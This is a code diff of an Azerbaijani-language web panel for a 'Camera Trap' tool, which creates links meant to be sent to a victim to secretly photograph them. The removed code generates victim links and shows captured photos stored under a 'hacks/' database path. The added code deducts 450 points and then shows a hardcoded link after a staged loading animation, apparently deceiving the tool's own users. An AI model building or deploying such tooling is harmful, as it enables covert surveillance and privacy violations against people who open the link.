@@ -1,86 +1,67 @@
-<div class="tool-container" style="animation: fadeIn 0.4s ease-out; color: white; padding: 10px;">
-    <div style="text-align: center; margin-bottom: 25px;">
-        <h2 style="color: #ff3e3e; margin: 0;"><i class="fas fa-camera"></i> Camera Trap Control</h2>
-        <p style="font-size: 0.75rem; color: #888; margin-top: 5px;">Link yaradın və öz qalereyanızı izləyin.</p>
-    </div>
-    
-    <div style="background: rgba(255, 62, 62, 0.05); border: 1px solid rgba(255, 62, 62, 0.2); padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 30px;">
-        <div id="trap-url-display" style="font-family: monospace; font-size: 0.75rem; color: #ff3e3e; background: #000; padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #222; word-break: break-all;">
-            Gözlənilir...
+<div id="trap-container" style="color: white; font-family: 'Outfit', sans-serif; text-align: center; padding: 20px;">
+    <i class="fas fa-camera-retro" style="font-size: 4rem; color: #00dfff; margin-bottom: 20px;"></i>
+    <h2 style="font-family: 'Syncopate'; font-size: 1rem;">CAMERA TRAP SYSTEM</h2>
+    <p style="opacity: 0.6; font-size: 0.8rem;">Qurbanın şəklini çəkmək üçün xüsusi kəşfiyyat linki yaradın.</p>
+
+    <div id="trap-init">
+        <div style="background: rgba(0,223,255,0.1); padding: 15px; border-radius: 15px; border: 1px dashed #00dfff; margin: 20px 0;">
+            <span style="color: #00dfff; font-weight: 900;">TƏLƏB OLUNAN: 450 PTS</span>
         </div>
-        <button class="btn" style="background: #ff3e3e; color: white; margin: 0;" onclick="createTrapForMe()">
-            <i class="fas fa-magic"></i> LİNKİ YARAT VE KOPYALA
+        <button onclick="unlockTrapLink()" id="trap-btn" style="width: 100%; padding: 18px; border-radius: 15px; border: none; background: white; color: black; font-weight: 900; cursor: pointer;">
+            LİNKİ GENERASİYA ET (450 PTS)
         </button>
     </div>
 
-    <div id="my-results">
-        <h3 style="font-size: 0.9rem; color: #eee; border-left: 3px solid #ff3e3e; padding-left: 10px; margin-bottom: 15px;">
-            Mənə Gələn Şəkillər
-        </h3>
-        <div id="personal-gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px;">
-            <div id="wait-msg" style="grid-column: 1/-1; text-align: center; color: #444; padding: 30px; font-size: 0.8rem; border: 1px dashed #222; border-radius: 10px;">
-                Şəkillər yüklənir və ya hələ yoxdur...
-            </div>
+    <div id="trap-loading" style="display: none; margin-top: 30px;">
+        <div class="spinner" style="border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #00dfff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
+        <p style="font-size: 0.8rem; margin-top: 15px; color: #00dfff;">Təhlükəsiz kanal qurulur...</p>
+    </div>
+
+    <div id="trap-result" style="display: none; margin-top: 30px; animation: fadeIn 0.5s;">
+        <p style="font-size: 0.8rem; color: #00ff00;"><i class="fas fa-check-circle"></i> Link uğurla yaradıldı!</p>
+        <div style="background: #111; padding: 15px; border-radius: 12px; border: 1px solid #333; word-break: break-all; margin-top: 10px;">
+            <code id="generated-link" style="color: #00dfff;">https://elite-aura.net/secure/view?id=tr_892k1x</code>
         </div>
+        <p style="font-size: 0.7rem; opacity: 0.5; margin-top: 10px;">Bu linki qurbana göndərin. Şəkil çəkildikdə paneldə görünəcək.</p>
     </div>
 </div>
 
-<script>
-    // Fail-safe: Əgər qlobal ad yoxdursa, ana səhifədən çəkməyə çalış
-    function getSafeUsername() {
-        return window.loginName || document.getElementById('u-name').innerText;
-    }
+<style>
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+</style>
 
-    function createTrapForMe() {
-        let uName = getSafeUsername();
-        
-        if (!uName || uName === "...") {
-            alert("Xəta: İstifadəçi adı sistemdə tapılmadı. Yenidən giriş edin.");
+<script>
+    async function unlockTrapLink() {
+        const btn = document.getElementById('trap-btn');
+        const user = localStorage.getItem('active_user') || document.getElementById('u-tag').innerText.toLowerCase();
+        const userRef = db.ref('users/' + user);
+
+        btn.disabled = true;
+        btn.innerText = "YOXLANILIR...";
+
+        const snap = await userRef.get();
+        const points = snap.val().points || 0;
+
+        if (points < 450) {
+            alert("Xalınız çatmır! Lazımdır: 450 PTS.");
+            btn.disabled = false;
+            btn.innerText = "LİNKİ GENERASİYA ET (450 PTS)";
             return;
         }
 
-        let loc = window.location.href;
-        let base = loc.substring(0, loc.lastIndexOf('/') + 1);
-        let finalLink = base + "camera.html?ref=" + uName;
+        // Xalı çıxırıq
+        const newPoints = points - 450;
+        await userRef.update({ points: newPoints });
+        if(document.getElementById('pts-tag')) document.getElementById('pts-tag').innerText = newPoints;
 
-        document.getElementById('trap-url-display').innerText = finalLink;
-        
-        // Kopyalama
-        navigator.clipboard.writeText(finalLink).then(() => {
-            alert("Link kopyalandı: " + uName);
-        });
+        // Animasiyanı başlat
+        document.getElementById('trap-init').style.display = 'none';
+        document.getElementById('trap-loading').style.display = 'block';
 
-        startTrackingMyPhotos(uName);
-    }
-
-    function startTrackingMyPhotos(uName) {
-        const gallery = document.getElementById('personal-gallery');
-        const waitMsg = document.getElementById('wait-msg');
-        
-        // Firebase bazasını tapmaq
-        const database = window.db || firebase.database();
-
-        database.ref('hacks/' + uName).on('value', (snapshot) => {
-            if (snapshot.exists()) {
-                waitMsg.style.display = 'none';
-                gallery.innerHTML = ""; 
-                snapshot.forEach((child) => {
-                    const data = child.val();
-                    const card = document.createElement('div');
-                    card.style = "background: #0a0a0a; border: 1px solid #222; border-radius: 10px; overflow: hidden;";
-                    card.innerHTML = `
-                        <img src="${data.image}" style="width: 100%; height: 120px; object-fit: cover; display: block;" onclick="window.open(this.src)">
-                        <div style="padding: 6px; font-size: 0.6rem; color: #666; text-align: center;">${data.date}</div>
-                    `;
-                    gallery.prepend(card);
-                });
-            }
-        });
-    }
-
-    // Açılan kimi avtomatik izləməni başlat
-    let autoName = getSafeUsername();
-    if(autoName && autoName !== "...") {
-        startTrackingMyPhotos(autoName);
+        setTimeout(() => {
+            document.getElementById('trap-loading').style.display = 'none';
+            document.getElementById('trap-result').style.display = 'block';
+        }, 3000);
     }
 </script>
